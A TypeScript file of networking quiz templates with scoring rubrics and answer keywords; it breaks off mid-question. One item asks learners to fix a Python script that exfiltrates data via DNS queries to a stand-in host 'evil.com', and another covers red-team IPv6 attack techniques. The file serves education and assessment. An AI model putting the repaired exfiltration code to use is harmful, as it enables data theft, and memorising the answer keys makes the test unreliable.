import type { QuestionTemplate } from "../types";

export const NETWORKING_TEMPLATES: QuestionTemplate[] = [
// --- net-fundamentals (Networking fundamentals) ---

// 1. TCP three-way handshake (difficulty 1, predict_output)
{
  competencyId: "net-fundamentals",
  subTopic: "tcp-handshake",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `You capture the following partial tcpdump output during a connection attempt from 10.0.0.5 to 10.0.0.10 port 443:

\`\`\`
14:32:01.001 IP 10.0.0.5.48210 > 10.0.0.10.443: Flags [S], seq 1000, win 64240, options [mss 1460,sackOK,TS val 100 ecr 0,nop,wscale 7], length 0
14:32:01.002 IP 10.0.0.10.443 > 10.0.0.5.48210: Flags [S.], seq 5000, ack 1001, win 65535, options [mss 1460,sackOK,TS val 200 ecr 100,nop,wscale 7], length 0
\`\`\`

What will the third packet look like? Specify the source, destination, TCP flags, sequence number, and acknowledgment number. Explain why each value is what it is.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "src_dst", description: "Correctly identifies source as 10.0.0.5:48210 and destination as 10.0.0.10:443", points: 1, keywords: ["10.0.0.5", "48210", "10.0.0.10", "443"], check: "Source and destination IP:port are reversed back to the original client->server direction" },
      { id: "ack_flag", description: "Identifies the third packet has the ACK flag set (no SYN)", points: 1, keywords: ["ACK", "Flags [.]", "A"], check: "States the third packet is ACK-only, not SYN-ACK" },
      { id: "seq_num", description: "Correctly states sequence number is 1001 (ISN + 1)", points: 2, keywords: ["1001", "seq 1001", "incremented", "SYN consumes"], check: "Explains that the client seq is now 1001 because SYN consumes one sequence number" },
      { id: "ack_num", description: "Correctly states acknowledgment number is 5001 (server ISN + 1)", points: 2, keywords: ["5001", "ack 5001", "server seq", "acknowledging"], check: "Explains ack number is server's ISN (5000) + 1, acknowledging the server's SYN" }
    ],
    gaps: [
      { if_missing: "seq_num", gap: "Does not understand that SYN and FIN flags consume one sequence number even though they carry no data" },
      { if_missing: "ack_num", gap: "Confused about the relationship between acknowledgment numbers and the remote peer's sequence space" },
      { if_missing: "ack_flag", gap: "Cannot distinguish TCP flag combinations in the three-way handshake phases" }
    ]
  }
},

// 2. Subnetting/CIDR (difficulty 2, predict_output)
{
  competencyId: "net-fundamentals",
  subTopic: "subnetting-cidr",
  questionType: "predict_output",
  difficulty: 2,
  questionText: `A network engineer configures the following interfaces on a Linux router:

\`\`\`
eth0: 192.168.10.65/27
eth1: 172.16.0.1/22
eth2: 10.0.0.1/30
\`\`\`

For each interface, determine:
1. The network address
2. The broadcast address
3. The number of usable host addresses
4. Whether the IP address 192.168.10.94 would be in the same subnet as eth0

Show your work for the subnet calculations.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "eth0_network", description: "Correctly calculates eth0 network as 192.168.10.64/27", points: 2, keywords: ["192.168.10.64", "/27", "network address", "subnet"], check: "Network address for .65/27 is .64 (64 is a multiple of 32)" },
      { id: "eth0_broadcast", description: "Correctly calculates eth0 broadcast as 192.168.10.95", points: 1, keywords: ["192.168.10.95", "broadcast"], check: "Broadcast is .64 + 31 = .95 for a /27" },
      { id: "eth1_calc", description: "Correctly calculates eth1 network 172.16.0.0/22 with 1022 usable hosts", points: 2, keywords: ["172.16.0.0", "172.16.3.255", "1022", "1024"], check: "Network is 172.16.0.0, broadcast is 172.16.3.255, usable hosts = 2^10 - 2 = 1022" },
      { id: "eth2_calc", description: "Correctly identifies eth2 as a /30 point-to-point with 2 usable hosts", points: 1, keywords: ["10.0.0.0", "10.0.0.3", "2 usable", "point-to-point"], check: "/30 gives 4 addresses total, 2 usable hosts" },
      { id: "same_subnet", description: "Correctly determines 192.168.10.94 is in the same subnet as eth0", points: 2, keywords: ["same subnet", "yes", "within range", "64 to 95", "between"], check: ".94 falls within .64-.95 range of the /27 subnet" }
    ],
    gaps: [
      { if_missing: "eth0_network", gap: "Cannot calculate network address from CIDR notation by finding the block boundary" },
      { if_missing: "eth1_calc", gap: "Struggles with subnets that span multiple octets (third-octet boundaries for /22)" },
      { if_missing: "same_subnet", gap: "Cannot determine subnet membership by checking if an address falls within the network/broadcast range" }
    ]
  }
},

// 3. ARP (difficulty 1, spot_vuln)
{
  competencyId: "net-fundamentals",
  subTopic: "arp-behavior",
  questionType: "spot_vuln",
  difficulty: 1,
  questionText: `Examine this ARP table from a workstation (192.168.1.100) on a corporate LAN:

\`\`\`
$ arp -a
gateway (192.168.1.1) at aa:bb:cc:dd:ee:01 [ether] on eth0
fileserver (192.168.1.50) at aa:bb:cc:dd:ee:50 [ether] on eth0
printer (192.168.1.200) at aa:bb:cc:dd:ee:c8 [ether] on eth0
webserver (192.168.1.10) at aa:bb:cc:dd:ee:01 [ether] on eth0
\`\`\`

Something is wrong with this ARP table. Identify the anomaly, explain what it likely indicates, and describe what impact this would have on traffic destined for the webserver.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "duplicate_mac", description: "Identifies that gateway and webserver share the same MAC address aa:bb:cc:dd:ee:01", points: 2, keywords: ["same MAC", "duplicate", "aa:bb:cc:dd:ee:01", "identical", "two entries"], check: "Points out that 192.168.1.1 and 192.168.1.10 both map to the same MAC" },
      { id: "spoofing", description: "Explains this indicates ARP spoofing or ARP poisoning", points: 2, keywords: ["ARP spoofing", "ARP poisoning", "ARP cache poisoning", "MITM", "man-in-the-middle"], check: "Identifies the cause as likely ARP spoofing/poisoning attack" },
      { id: "traffic_impact", description: "Explains that webserver traffic would go to the gateway's MAC (or attacker)", points: 2, keywords: ["redirected", "intercepted", "sent to gateway", "wrong destination", "attacker receives"], check: "Describes that frames destined for the webserver would be sent to whatever device owns that MAC, enabling interception" }
    ],
    gaps: [
      { if_missing: "duplicate_mac", gap: "Cannot read ARP tables or does not understand the IP-to-MAC mapping relationship" },
      { if_missing: "spoofing", gap: "Does not understand ARP spoofing as an attack vector on local networks" },
      { if_missing: "traffic_impact", gap: "Does not understand that Ethernet frames are addressed by MAC, so a poisoned ARP entry misdirects traffic at Layer 2" }
    ]
  }
},

// 4. DNS resolution (difficulty 2, spot_vuln)
{
  competencyId: "net-fundamentals",
  subTopic: "dns-resolution",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `A sysadmin troubleshoots DNS on a Linux server. Here is the output of several commands:

\`\`\`
$ cat /etc/resolv.conf
nameserver 8.8.8.8
nameserver 1.1.1.1

$ dig example.internal +short
10.0.5.20

$ dig example.internal @8.8.8.8 +short
(no output)

$ dig example.internal @1.1.1.1 +short
(no output)

$ dig example.internal @10.0.0.2 +short
10.0.5.20

$ cat /etc/nsswitch.conf | grep hosts
hosts: files mdns4_minimal [NOTFOUND=return] dns

$ cat /etc/hosts
127.0.0.1 localhost
10.0.5.20 example.internal
\`\`\`

Why does \`dig example.internal +short\` return 10.0.5.20 even though neither configured nameserver knows about this domain? What security concern does this create?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "hosts_file", description: "Identifies that /etc/hosts contains the mapping for example.internal", points: 2, keywords: ["/etc/hosts", "hosts file", "local resolution", "static entry"], check: "Correctly identifies the /etc/hosts file as the source of the resolution" },
      { id: "nsswitch", description: "Explains that nsswitch.conf prioritizes 'files' before 'dns'", points: 2, keywords: ["nsswitch", "files", "priority", "order", "lookup order", "before dns"], check: "Explains the resolution order: files (hosts) is checked before dns" },
      { id: "dig_caveat", description: "Notes that dig bypasses /etc/hosts and queries DNS directly, so the first dig must use a different resolver or the system resolver library", points: 1, keywords: ["dig", "bypass", "resolver library", "getaddrinfo", "system resolver", "stub resolver"], check: "Acknowledges the nuance that dig typically queries DNS servers directly, not /etc/hosts -- so the +short result suggests the system's stub resolver or a local DNS cache is involved" },
      { id: "security_concern", description: "Identifies the security risk of hardcoded hosts entries", points: 2, keywords: ["stale", "hijack", "redirect", "outdated", "no validation", "DNSSEC", "poisoned", "tampered"], check: "Explains that a hosts file entry can be tampered with by anyone with root, bypasses DNSSEC, and creates a stale/unmanaged mapping" }
    ],
    gaps: [
      { if_missing: "hosts_file", gap: "Does not understand the role of /etc/hosts in local name resolution" },
      { if_missing: "nsswitch", gap: "Does not understand nsswitch.conf and the resolution order for hostname lookups on Linux" },
      { if_missing: "security_concern", gap: "Cannot identify the security implications of static host entries versus dynamic DNS resolution" }
    ]
  }
},

// 5. OSI model layers (difficulty 3, trace_explain)
{
  competencyId: "net-fundamentals",
  subTopic: "osi-encapsulation",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A user on Host A (IP: 192.168.1.10, MAC: AA:AA:AA:AA:AA:AA) opens a browser and requests http://192.168.2.50/index.html. The default gateway is 192.168.1.1 (MAC: BB:BB:BB:BB:BB:BB). The web server Host B is on a different subnet (192.168.2.50, MAC: CC:CC:CC:CC:CC:CC).

Trace the journey of the HTTP GET request from Host A to Host B, layer by layer. For each OSI layer (from Application down to Physical), describe:
1. What data unit is created or modified
2. What addressing is used
3. How the addresses change (or don't) at the router

Pay special attention to what happens to the Layer 2 and Layer 3 headers when the packet crosses the router.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "app_layer", description: "Describes HTTP GET request generation at Application layer", points: 1, keywords: ["HTTP", "GET", "application layer", "Layer 7", "/index.html"], check: "Mentions HTTP GET request with the URL/path at the application layer" },
      { id: "transport_layer", description: "Describes TCP segment with source ephemeral port and destination port 80", points: 1, keywords: ["TCP", "segment", "port 80", "ephemeral", "source port", "Layer 4"], check: "Identifies TCP encapsulation with port 80 destination and random high source port" },
      { id: "network_layer", description: "Describes IP packet with src 192.168.1.10 and dst 192.168.2.50 that stays constant", points: 2, keywords: ["IP", "192.168.1.10", "192.168.2.50", "packet", "Layer 3", "unchanged", "end-to-end"], check: "States that IP source and destination remain the same end-to-end (no NAT mentioned)" },
      { id: "l2_first_hop", description: "Describes Ethernet frame on first hop: src MAC AA:AA, dst MAC BB:BB (gateway)", points: 2, keywords: ["AA:AA", "BB:BB", "gateway MAC", "frame", "Layer 2", "default gateway"], check: "On the first segment, dst MAC is the gateway, NOT the final destination" },
      { id: "l2_rewrite", description: "Explains that the router rewrites L2 headers: new src MAC = router's other interface, new dst MAC = CC:CC (Host B)", points: 2, keywords: ["rewrite", "new frame", "CC:CC", "router MAC", "decapsulate", "re-encapsulate", "Layer 2 change"], check: "Explains the router strips the old frame, looks up the route, and creates a new frame with its own src MAC and Host B's dst MAC" }
    ],
    gaps: [
      { if_missing: "l2_first_hop", gap: "Does not understand that the Ethernet destination on the first hop is the gateway's MAC, not the final destination's MAC" },
      { if_missing: "l2_rewrite", gap: "Does not understand that routers decapsulate and re-encapsulate at Layer 2 while preserving Layer 3 addresses" },
      { if_missing: "network_layer", gap: "Confused about the end-to-end nature of IP addressing versus hop-by-hop nature of MAC addressing" }
    ]
  }
},

// 6. Routing tables (difficulty 3, trace_explain)
{
  competencyId: "net-fundamentals",
  subTopic: "routing-table",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A Linux router has the following routing table:

\`\`\`
$ ip route show
default via 203.0.113.1 dev eth0
10.0.0.0/8 via 10.1.1.1 dev eth1
10.1.0.0/16 via 10.1.2.1 dev eth2
10.1.1.0/24 dev eth1 proto kernel scope link src 10.1.1.254
172.16.0.0/12 via 10.1.1.1 dev eth1
192.168.0.0/16 unreachable
\`\`\`

For each of the following destination IPs, determine which route is matched, which interface the packet exits through, and what the next-hop gateway is. Explain the matching logic:
1. 10.1.1.50
2. 10.1.2.100
3. 10.2.0.5
4. 192.168.1.1
5. 8.8.8.8`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "longest_prefix", description: "Explains longest prefix match as the fundamental routing decision algorithm", points: 2, keywords: ["longest prefix", "most specific", "prefix length", "best match", "longest match"], check: "Explicitly states that the most specific (longest prefix) matching route wins" },
      { id: "directly_connected", description: "Correctly routes 10.1.1.50 via eth1 as directly connected (/24 is longest match)", points: 2, keywords: ["10.1.1.0/24", "eth1", "directly connected", "on-link", "no gateway", "scope link"], check: "10.1.1.50 matches the /24 connected route on eth1 (no next-hop gateway needed)" },
      { id: "mid_prefix", description: "Correctly routes 10.1.2.100 via eth2 (10.1.0.0/16 is more specific than 10.0.0.0/8)", points: 2, keywords: ["10.1.0.0/16", "eth2", "10.1.2.1", "/16 more specific"], check: "10.1.2.100 matches /16 via eth2, not the /8" },
      { id: "unreachable", description: "Correctly identifies 192.168.1.1 as unreachable (ICMP destination unreachable returned)", points: 1, keywords: ["unreachable", "ICMP", "rejected", "192.168.0.0/16", "no route", "administratively prohibited"], check: "192.168.1.1 matches the unreachable route, packet is dropped with ICMP error" },
      { id: "default_route", description: "Routes 8.8.8.8 via default gateway 203.0.113.1 on eth0", points: 1, keywords: ["default", "203.0.113.1", "eth0", "0.0.0.0/0", "gateway of last resort"], check: "8.8.8.8 matches no specific route, falls through to default" }
    ],
    gaps: [
      { if_missing: "longest_prefix", gap: "Does not understand the longest prefix match algorithm used in IP routing" },
      { if_missing: "directly_connected", gap: "Cannot distinguish between directly connected routes (no next-hop) and routes with a gateway" },
      { if_missing: "unreachable", gap: "Does not understand the 'unreachable' route type and its behavior (administratively blocking a prefix)" }
    ]
  }
},

// 7. NAT (difficulty 3, trace_explain)
{
  competencyId: "net-fundamentals",
  subTopic: "nat-translation",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A home router performs PAT (Port Address Translation) with external IP 82.100.50.1. Two internal hosts make simultaneous HTTP requests:

\`\`\`
Host A (192.168.1.10:45000) -> GET http://example.com (93.184.216.34:80)
Host B (192.168.1.20:45000) -> GET http://example.com (93.184.216.34:80)
\`\`\`

The router's NAT table after translation shows:

\`\`\`
Internal              External              Remote
192.168.1.10:45000    82.100.50.1:10001     93.184.216.34:80
192.168.1.20:45000    82.100.50.1:10002     93.184.216.34:80
\`\`\`

1. Why can't the router simply translate both connections using the same external port?
2. When the web server sends a response to 82.100.50.1:10002, explain step by step how the router determines which internal host to forward the packet to.
3. What problems does NAT create for protocols like FTP active mode or SIP?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "port_collision", description: "Explains that the same external IP:port cannot be used for both because return packets would be ambiguous", points: 2, keywords: ["ambiguous", "collision", "cannot distinguish", "same tuple", "unique", "five-tuple", "port conflict"], check: "Explains that if both used 82.100.50.1:45000, the router couldn't tell which internal host a response from 93.184.216.34:80 belongs to" },
      { id: "reverse_lookup", description: "Describes the reverse NAT lookup process: match dst port 10002, look up NAT table, rewrite dst to 192.168.1.20:45000", points: 3, keywords: ["NAT table lookup", "reverse", "rewrite destination", "192.168.1.20", "translate back", "conntrack"], check: "Step-by-step: router receives packet to :10002, looks up in NAT table, rewrites destination IP and port to 192.168.1.20:45000, forwards on LAN" },
      { id: "protocol_issues", description: "Explains that NAT breaks protocols that embed IP addresses in payload (FTP PORT, SIP)", points: 2, keywords: ["payload", "embedded IP", "ALG", "application layer gateway", "FTP PORT", "SIP", "data channel", "private IP in body"], check: "Explains that FTP active mode sends the private IP inside the FTP PORT command, which the remote server cannot reach" },
      { id: "nat_type", description: "Distinguishes PAT/NAPT from basic NAT (one-to-one)", points: 1, keywords: ["PAT", "NAPT", "overload", "many-to-one", "port address translation"], check: "Acknowledges that this is PAT/NAPT (many internal IPs sharing one external IP via port mapping)" }
    ],
    gaps: [
      { if_missing: "port_collision", gap: "Does not understand why PAT must assign unique external ports to distinguish connections sharing the same external IP" },
      { if_missing: "reverse_lookup", gap: "Cannot explain the stateful reverse translation process that NAT routers use for return traffic" },
      { if_missing: "protocol_issues", gap: "Unaware that NAT breaks protocols that embed IP addresses in the application-layer payload" }
    ]
  }
},

// 8. TCP vs UDP (difficulty 3, fix_code)
{
  competencyId: "net-fundamentals",
  subTopic: "tcp-vs-udp",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `A junior developer wrote this Python script to exfiltrate data over DNS queries (for a lab exercise). The script hangs and never receives a response. Identify the bugs and fix the approach:

\`\`\`python
import socket

def exfil_dns(data, dns_server="8.8.8.8"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dns_server, 53))

    # Build a DNS query for data.evil.com
    query = build_dns_query(data + ".evil.com")
    sock.send(query)

    response = sock.recv(4096)
    return parse_dns_response(response)
\`\`\`

1. What is wrong with using SOCK_STREAM for standard DNS queries?
2. What additional issue exists when DNS *is* used over TCP?
3. Rewrite the critical lines to fix the transport-layer issues (you don't need to implement build_dns_query/parse_dns_response).`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "udp_not_tcp", description: "Identifies that standard DNS uses UDP (SOCK_DGRAM), not TCP (SOCK_STREAM)", points: 2, keywords: ["UDP", "SOCK_DGRAM", "port 53", "DNS uses UDP", "connectionless"], check: "States that DNS typically uses UDP and SOCK_STREAM should be SOCK_DGRAM" },
      { id: "tcp_dns_length", description: "Explains that DNS over TCP requires a 2-byte length prefix before the query", points: 2, keywords: ["length prefix", "2-byte", "TCP length", "RFC 1035", "message length", "struct.pack"], check: "Knows that DNS-over-TCP prepends a 2-byte big-endian length field" },
      { id: "no_connect_udp", description: "Notes that UDP doesn't use connect()/send() in the same way; should use sendto() or connect() is optional", points: 1, keywords: ["sendto", "recvfrom", "no connection", "connect optional", "datagram"], check: "Addresses that UDP sockets use sendto/recvfrom instead of connect/send (or notes that connect on UDP just sets default dest)" },
      { id: "fix_code", description: "Provides corrected code using SOCK_DGRAM with sendto/recvfrom", points: 2, keywords: ["SOCK_DGRAM", "sendto", "recvfrom", "socket.socket"], check: "Shows corrected socket creation and data transmission using UDP" },
      { id: "timeout", description: "Mentions that UDP has no built-in reliability, so a timeout/retry is needed", points: 1, keywords: ["timeout", "settimeout", "retry", "no guarantee", "unreliable"], check: "Notes that UDP is unreliable and the code should set a socket timeout" }
    ],
    gaps: [
      { if_missing: "udp_not_tcp", gap: "Does not know that DNS primarily uses UDP on port 53 (TCP is used only for zone transfers or responses > 512 bytes)" },
      { if_missing: "tcp_dns_length", gap: "Unaware of the DNS-over-TCP framing requirement (2-byte length prefix per RFC 1035 section 4.2.2)" },
      { if_missing: "timeout", gap: "Does not consider UDP unreliability and the need for application-layer timeout/retransmission" }
    ]
  }
},

// 9. DHCP (difficulty 3, trace_explain)
{
  competencyId: "net-fundamentals",
  subTopic: "dhcp-process",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A new laptop connects to a corporate Wi-Fi network. Here is the tcpdump capture of the DHCP exchange:

\`\`\`
15:00:01.100 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request, xid 0xaabbccdd
  Option 53: DHCP Discover
  Option 12: Hostname "laptop-jdoe"
  Option 55: Parameter Request List: Subnet Mask, Router, DNS, Domain Name

15:00:01.150 IP 10.0.0.1.67 > 255.255.255.255.68: BOOTP/DHCP, Reply, xid 0xaabbccdd
  Option 53: DHCP Offer
  Option 54: Server Identifier 10.0.0.1
  yiaddr: 10.0.0.100
  Option 1: Subnet Mask 255.255.255.0
  Option 3: Router 10.0.0.1
  Option 6: DNS 10.0.0.2
  Option 51: Lease Time 86400

15:00:01.155 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request, xid 0xaabbccdd
  Option 53: DHCP Request
  Option 50: Requested IP 10.0.0.100
  Option 54: Server Identifier 10.0.0.1

15:00:01.160 IP 10.0.0.1.67 > 255.255.255.255.68: BOOTP/DHCP, Reply, xid 0xaabbccdd
  Option 53: DHCP ACK
  yiaddr: 10.0.0.100
\`\`\`

1. Why does the client send from 0.0.0.0 and why are messages broadcast to 255.255.255.255?
2. Why is there a separate Request after the Offer (why not just use the offered IP immediately)?
3. The lease time is 86400 seconds. At what point will the client attempt to renew, and what happens if the server is unavailable at that time?
4. What would happen if there were two DHCP servers on this network?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "no_ip_yet", description: "Explains that the client has no IP yet so must use 0.0.0.0 as source and broadcast to find servers", points: 2, keywords: ["no IP address", "0.0.0.0", "broadcast", "255.255.255.255", "no unicast possible", "DORA"], check: "Client cannot use unicast because it has no assigned IP; broadcast ensures any DHCP server on the segment receives it" },
      { id: "request_purpose", description: "Explains that the Request phase informs all servers which offer was accepted (so others can reclaim)", points: 2, keywords: ["multiple servers", "accept", "decline", "reclaim", "inform other servers", "broadcast request"], check: "The Request is broadcast so all DHCP servers know which offer was accepted, allowing non-selected servers to release the reserved IP" },
      { id: "renewal_timing", description: "States renewal at T1 (50% of lease = 43200s/12 hours) then rebind at T2 (87.5%)", points: 2, keywords: ["T1", "50%", "43200", "12 hours", "renewal", "T2", "87.5%", "rebind"], check: "Describes the T1 (50%) renewal attempt via unicast and T2 (87.5%) rebind attempt via broadcast" },
      { id: "two_servers", description: "Explains the behavior with two DHCP servers: client receives two Offers and selects one", points: 2, keywords: ["two offers", "select", "first offer", "rogue DHCP", "conflict", "DHCP snooping"], check: "With two servers, client gets two Offers and broadcasts a Request for one; can cause issues with rogue DHCP servers" }
    ],
    gaps: [
      { if_missing: "no_ip_yet", gap: "Does not understand why DHCP uses broadcast at L3 and L2 (the chicken-and-egg problem of needing an IP to communicate)" },
      { if_missing: "request_purpose", gap: "Does not understand the DORA four-step process and why the explicit Request/ACK is needed after Discover/Offer" },
      { if_missing: "renewal_timing", gap: "Does not know the DHCP lease renewal timing (T1 at 50%, T2 at 87.5%) and the unicast-then-broadcast escalation" }
    ]
  }
},

// 10. ICMP / MTU fragmentation (difficulty 3, fix_code)
{
  competencyId: "net-fundamentals",
  subTopic: "mtu-fragmentation",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `A network engineer is troubleshooting a VPN tunnel. Users can ping the remote network but cannot load web pages. Small transfers work fine, but large file downloads stall. The engineer runs these tests:

\`\`\`
$ ping -c 1 -s 1472 -M do 10.10.10.1
PING 10.10.10.1 (10.10.10.1) 1472(1500) bytes of data.
76 bytes from 172.16.0.1: icmp_seq=1 Fragmentation needed, mtu=1400

$ ping -c 1 -s 1372 -M do 10.10.10.1
PING 10.10.10.1 (10.10.10.1) 1372(1400) bytes of data.
76 bytes from 10.10.10.1: icmp_seq=1 ttl=62 time=15.3 ms
\`\`\`

The current tunnel interface configuration is:

\`\`\`
tun0: mtu 1500
  inet 10.10.10.2/24
\`\`\`

1. Explain why 1472 bytes fails with "Fragmentation needed" but 1372 bytes succeeds.
2. What do the numbers 1472, 1500, 1372, and 1400 each represent?
3. Write the exact commands to fix this issue on the tunnel interface.
4. What is PMTUD and why is it sometimes broken in practice?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "mtu_math", description: "Explains 1472 + 28 bytes (20 IP + 8 ICMP headers) = 1500 byte packet, which exceeds the path MTU of 1400", points: 2, keywords: ["1472", "28 bytes", "20 IP header", "8 ICMP header", "1500", "overhead", "exceeds 1400"], check: "Shows the math: payload 1472 + IP header 20 + ICMP header 8 = 1500, but the path only supports 1400" },
      { id: "vpn_overhead", description: "Identifies that the VPN/tunnel adds encapsulation overhead reducing the effective MTU", points: 2, keywords: ["encapsulation", "tunnel overhead", "GRE", "IPsec", "VPN header", "additional headers"], check: "Explains that the tunnel wraps packets in additional headers (IPsec/GRE/etc), reducing available space from 1500 to 1400" },
      { id: "fix_command", description: "Provides the correct command to set the tunnel MTU to 1400 or set TCP MSS clamping", points: 2, keywords: ["ip link set", "mtu 1400", "tun0", "MSS clamping", "iptables", "TCPMSS", "tcp-mss"], check: "Shows 'ip link set tun0 mtu 1400' and/or iptables MSS clamping rule" },
      { id: "pmtud", description: "Explains PMTUD and why ICMP blocking breaks it", points: 2, keywords: ["Path MTU Discovery", "PMTUD", "DF bit", "Don't Fragment", "ICMP blocked", "firewall", "black hole"], check: "Explains PMTUD uses DF bit + ICMP Fragmentation Needed responses, but firewalls often block ICMP type 3 code 4, creating PMTUD black holes" }
    ],
    gaps: [
      { if_missing: "mtu_math", gap: "Cannot calculate total packet size from payload + headers and compare to MTU" },
      { if_missing: "vpn_overhead", gap: "Does not understand that tunnels/VPNs add encapsulation overhead that reduces effective MTU" },
      { if_missing: "pmtud", gap: "Does not understand Path MTU Discovery and why ICMP filtering causes MTU black holes" }
    ]
  }
},

// 11. VLANs (difficulty 4, design_solution)
{
  competencyId: "net-fundamentals",
  subTopic: "vlan-design",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You are designing the network segmentation for a small company with the following requirements:

- 30 developers who need access to internal git servers and CI/CD
- 10 HR staff who handle sensitive employee data and need access to an HR application server
- 5 IT admins who need access to all network segments for management
- A DMZ with 3 public-facing web servers
- Guest Wi-Fi for visitors (internet-only, no access to internal resources)
- IP phones on every desk that should be on their own network

Design a VLAN architecture. For each VLAN, specify:
1. VLAN ID and name
2. Subnet assignment (use 10.x.x.x/xx addressing)
3. What devices/users belong to it
4. What inter-VLAN routing rules should apply (what can talk to what)
5. How you would handle the IT admins' need to access all segments securely

Also explain: What type of switch port would the developer workstations connect to? What about the uplink between switches?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "vlan_separation", description: "Creates at least 5-6 distinct VLANs for proper segmentation", points: 2, keywords: ["VLAN 10", "VLAN 20", "developers", "HR", "DMZ", "guest", "voice", "management"], check: "Defines separate VLANs for at minimum: dev, HR, DMZ, guest, voice, and management/IT" },
      { id: "subnet_sizing", description: "Assigns appropriately sized subnets (not /8 for 10 hosts)", points: 1, keywords: ["/24", "/25", "/26", "/27", "/28", "subnet", "right-sized"], check: "Subnets are reasonably sized for the number of hosts (e.g., /26 or /27 for small groups)" },
      { id: "acl_rules", description: "Specifies inter-VLAN access control rules that follow least privilege", points: 2, keywords: ["ACL", "access control", "deny", "permit", "firewall rules", "least privilege", "inter-VLAN"], check: "HR cannot reach dev, guest cannot reach internal, DMZ is restricted, etc." },
      { id: "guest_isolation", description: "Guest VLAN has internet-only access with no routes to internal VLANs", points: 1, keywords: ["guest isolation", "internet only", "no internal", "captive portal", "isolated"], check: "Guest network can only reach the internet, all internal VLAN traffic is blocked" },
      { id: "trunk_access", description: "Correctly explains access ports for workstations and trunk ports for switch-to-switch links", points: 2, keywords: ["access port", "trunk port", "802.1Q", "tagged", "untagged", "native VLAN"], check: "Workstation ports are access ports (untagged, single VLAN); inter-switch links are 802.1Q trunks carrying multiple VLANs" },
      { id: "admin_access", description: "Addresses IT admin access to all segments via management VLAN, jump host, or VPN", points: 2, keywords: ["management VLAN", "jump host", "bastion", "VPN", "admin access", "out-of-band"], check: "IT admins use a management VLAN with controlled routing to other segments, or a jump host/bastion approach" }
    ],
    gaps: [
      { if_missing: "acl_rules", gap: "Designs VLANs without access control, treating segmentation as sufficient security without inter-VLAN firewall rules" },
      { if_missing: "trunk_access", gap: "Does not understand the difference between trunk (tagged) and access (untagged) switch port modes" },
      { if_missing: "admin_access", gap: "Cannot design a secure management access pattern for administrators who need cross-VLAN visibility" }
    ]
  }
},

// 12. IPv6 (difficulty 4, compare_contrast)
{
  competencyId: "net-fundamentals",
  subTopic: "ipv6-vs-ipv4",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare IPv4 and IPv6 from a red team perspective. Consider the following scenarios and analyze how the attacker's approach changes:

1. **Host discovery**: On an IPv4 /24 subnet, an attacker can scan all 254 hosts in seconds. How does this change on an IPv6 /64 subnet? What alternative host discovery techniques exist for IPv6?

2. **MITM attacks**: ARP spoofing is a classic IPv4 MITM technique. What is the IPv6 equivalent? How do the attack mechanics differ?

3. **NAT and reachability**: In IPv4, NAT provides incidental security by hiding internal hosts. How does IPv6's approach to addressing change an attacker's attack surface?

4. **Firewall evasion**: Can an attacker use IPv6 to bypass IPv4-only firewall rules in a dual-stack environment? Give a concrete example.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "discovery_difference", description: "Explains that scanning a /64 is infeasible (2^64 addresses) and names alternative discovery methods", points: 2, keywords: ["2^64", "infeasible", "multicast", "ff02::1", "NDP", "neighbor solicitation", "DHCPv6 logs", "DNS AAAA"], check: "States that brute-force scanning a /64 is impossible; mentions multicast ping (ff02::1), NDP, or passive sniffing as alternatives" },
      { id: "ndp_spoofing", description: "Identifies NDP (Neighbor Discovery Protocol) spoofing as the IPv6 equivalent of ARP spoofing", points: 2, keywords: ["NDP", "Neighbor Discovery", "neighbor advertisement", "RA spoofing", "Router Advertisement", "ICMPv6", "SLAAC"], check: "Names NDP/Neighbor Advertisement spoofing or rogue Router Advertisement attacks as IPv6 MITM equivalents" },
      { id: "no_nat_exposure", description: "Explains that IPv6 typically gives globally routable addresses to all hosts, expanding the attack surface", points: 2, keywords: ["globally routable", "no NAT", "end-to-end", "larger attack surface", "directly reachable"], check: "States that without NAT, internal hosts may be directly reachable from the internet if firewalls are misconfigured" },
      { id: "dual_stack_bypass", description: "Gives a concrete IPv6 firewall bypass example in a dual-stack environment", points: 2, keywords: ["dual-stack", "bypass", "IPv6 tunnel", "ip6tables", "forgotten rules", "IPv4-only firewall"], check: "Explains that admins often configure IPv4 firewall rules but forget to apply equivalent IPv6 rules, allowing bypass" },
      { id: "mitigation", description: "Mentions at least one defensive measure for IPv6 attacks", points: 2, keywords: ["RA Guard", "SEND", "DHCPv6 guard", "ip6tables", "IPv6 firewall", "network segmentation"], check: "Names defensive measures like RA Guard, SEND, or proper IPv6 firewall configuration" }
    ],
    gaps: [
      { if_missing: "discovery_difference", gap: "Does not understand the fundamental impact of IPv6's massive address space on traditional scanning techniques" },
      { if_missing: "ndp_spoofing", gap: "Does not know that NDP replaces ARP in IPv6 and introduces its own spoofing attack vectors" },
      { if_missing: "dual_stack_bypass", gap: "Unaware that dual-stack environments commonly have IPv6 firewall misconfigurations that attackers can exploit" }
    ]
  }
},

// 13. Wireshark/tcpdump analysis (difficulty 4, design_solution)
{
  competencyId: "net-fundamentals",
  subTopic: "packet-analysis",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You've been asked to write a tcpdump monitoring script for an IDS-like system on a Linux gateway. The script should capture and alert on the following suspicious activities:

